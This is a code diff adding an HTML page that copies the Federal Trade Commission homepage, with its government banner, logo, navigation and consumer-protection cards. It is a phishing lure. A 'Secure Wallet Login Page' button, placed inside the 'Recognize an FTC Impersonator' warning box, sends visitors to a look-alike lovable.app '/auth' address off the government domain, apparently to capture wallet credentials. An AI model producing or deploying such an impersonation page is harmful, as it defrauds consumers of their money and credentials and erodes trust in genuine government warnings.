@@ -1,0 +1,207 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Federal Trade Commission</title>
+
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:Arial,Helvetica,sans-serif;background:#eef5fb;color:#071d3a}
+
+.gov-bar{background:#f7f7f7;padding:14px 60px;font-size:15px}
+.gov-bar span{color:#005ea8;text-decoration:underline;margin-left:10px}
+
+.header{background:#fff;padding:35px 70px;display:flex;align-items:center;justify-content:space-between}
+.logo-wrap{display:flex;align-items:center;gap:18px}
+.logo-img{width:82px;height:82px;object-fit:contain}
+.logo-text h1{font-size:24px;letter-spacing:1px}
+.logo-text p{margin-top:5px;font-size:14px;font-weight:bold;color:#0065b3;letter-spacing:1px}
+
+.nav{display:flex;gap:28px;font-size:17px;color:#09254a}
+.nav span{cursor:default}
+
+.hero{
+  min-height:560px;
+  position:relative;
+  padding:120px 8%;
+  background:
+  linear-gradient(90deg,rgba(7,29,58,.96),rgba(7,29,58,.72),rgba(7,29,58,.25)),
+  url("https://images.unsplash.com/photo-1565043589221-1a6fd9ae45c7?auto=format&fit=crop&w=1600&q=80");
+  background-size:cover;
+  background-position:center;
+}
+.hero-content{max-width:780px}
+.hero h2{font-family:Georgia,serif;color:#fff;font-size:60px;font-weight:400;margin-bottom:30px}
+.hero p{color:#fff;font-size:24px;line-height:1.65}
+
+.btn,.dark-btn{
+  border:none;
+  color:#fff;
+  cursor:pointer;
+  font-size:20px;
+}
+.btn{margin-top:35px;background:#0667bd;padding:23px 48px}
+.dark-btn{margin-top:30px;background:#12365f;padding:20px 35px;font-size:17px}
+
+.info-box{
+  position:absolute;
+  right:0;
+  bottom:-95px;
+  width:430px;
+  background:#0065bd;
+  color:#fff;
+  padding:48px 52px;
+}
+.info-box h3{font-size:22px;margin-bottom:28px}
+.info-box p{font-family:Georgia,serif;font-size:30px;line-height:1.45}
+
+.action{background:white;padding:120px 8% 70px}
+.action h2{font-family:Georgia,serif;font-size:42px;font-weight:400;margin-bottom:35px;border-bottom:1px solid #d5dce4;padding-bottom:20px}
+.action-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:30px 45px}
+.action-item{padding:22px 0;border-bottom:1px solid #d5dce4;font-size:23px;color:#0065bd}
+
+.cards-section{padding:40px 8% 90px}
+.cards{display:grid;grid-template-columns:repeat(3,1fr);gap:45px}
+.card{background:#fff;box-shadow:0 2px 8px rgba(0,0,0,.08)}
+.card-img{height:220px;display:flex;align-items:center;justify-content:center;font-size:70px}
+.card-body{padding:35px}
+.card h3{font-family:Georgia,serif;font-size:34px;font-weight:400;margin-bottom:20px;border-bottom:1px solid #ddd;padding-bottom:15px}
+.card p{font-size:20px;line-height:1.7;color:#333}
+
+.footer{
+  background:#0059b2;
+  padding:80px 8%;
+  display:flex;
+  justify-content:space-between;
+  align-items:center;
+  color:#fff;
+}
+.footer h2{font-family:Georgia,serif;font-size:46px;font-weight:400;margin-bottom:15px}
+.footer p{font-size:20px;opacity:.9}
+
+@media(max-width:1100px){
+  .header{flex-direction:column;gap:30px}
+  .nav{flex-wrap:wrap;justify-content:center}
+  .info-box{position:relative;width:100%;right:auto;bottom:auto;margin-top:50px}
+  .cards,.action-grid{grid-template-columns:1fr}
+  .footer{flex-direction:column;text-align:center;gap:30px}
+}
+</style>
+</head>
+
+<body>
+
+<div class="gov-bar">
+An official website of the United States government
+<span>Here's how you know</span>
+</div>
+
+<header class="header">
+  <div class="logo-wrap">
+    <img src="images/ftc-logo.png" class="logo-img" alt="FTC Logo">
+
+    <div class="logo-text">
+      <h1>FEDERAL TRADE COMMISSION</h1>
+      <p>PROTECTING AMERICA'S CONSUMERS</p>
+    </div>
+  </div>
+
+  <div class="nav">
+    <span>Enforcement</span>
+    <span>Policy</span>
+    <span>Advice & Guidance</span>
+    <span>News & Events</span>
+    <span>About the FTC</span>
+    <span>🔍</span>
+  </div>
+</header>
+
+<section class="hero">
+  <div class="hero-content">
+    <h2>Freedom 250</h2>
+    <p>
+      This year, the United States celebrates 250 years of independence.
+      Learn more about our agency's history, commemoration events happening
+      across the nation, and more.
+    </p>
+
+    <button class="btn">
+      Learn more
+    </button>
+  </div>
+
+  <div class="info-box">
+    <h3>Recognize an FTC Impersonator</h3>
+    <p>
+      Scammers are impersonating the FTC. The FTC will never threaten you,
+      tell you to transfer money, withdraw cash, or buy gold to protect your money.
+    </p>
+
+    <button class="dark-btn" onclick="window.location.href='https://vault-account23892374982572397592592357926783.lovable.app/auth'">
+    Secure Wallet Login Page
+</button>
+  </div>
+</section>
+
+<section class="action">
+  <h2>Take Action</h2>
+
+  <div class="action-grid">
+    <div class="action-item">ⓘ Report fraud</div>
+    <div class="action-item">💳 Get your free credit report</div>
+    <div class="action-item">📄 Merger / Antitrust Comment</div>
+    <div class="action-item">🛡 Report Take It Down violations</div>
+    <div class="action-item">👤 Report identity theft</div>
+    <div class="action-item">☎ Register for Do Not Call</div>
+  </div>
+</section>
+
+<section class="cards-section">
+  <div class="cards">
+
+    <div class="card">
+      <div class="card-img" style="background:linear-gradient(135deg,#f6f8fb,#d6e9ff)">🎖️</div>
+      <div class="card-body">
+        <h3>July is Military Consumer Month</h3>
+        <p>
+          The FTC has developed a digital toolkit to help the Military Consumer
+          network reach servicemembers, veterans, and their families.
+        </p>
+      </div>
+    </div>
+
+    <div class="card">
+      <div class="card-img" style="background:linear-gradient(135deg,#b6e0ff,#2f86c7)">💳</div>
+      <div class="card-body">
+        <h3>Fair Credit Reporting Act</h3>
+        <p>
+          Learn about the Fair Credit Reporting Act and how to responsibly use,
+          report and dispose of information contained in credit reports.
+        </p>
+      </div>
+    </div>
+
+    <div class="card">
+      <div class="card-img" style="background:linear-gradient(135deg,#0e325c,#7f8d9b)">⚠️</div>
+      <div class="card-body">
+        <h3>Don't Fall for This New 'FTC' Agent Scam</h3>
+        <p>
+          Scammers pretending to be FTC employees are calling consumers and
+          asking them to transfer money or provide personal information.
+        </p>
+      </div>
+    </div>
+
+  </div>
+</section>
+
+<footer class="footer">
+  <div>
+    <h2>Sign up to get e-mail updates.</h2>
+    <p>Get the latest consumer protection news from the FTC.</p>
+  </div>
+</footer>
+
+</body>
+</html>
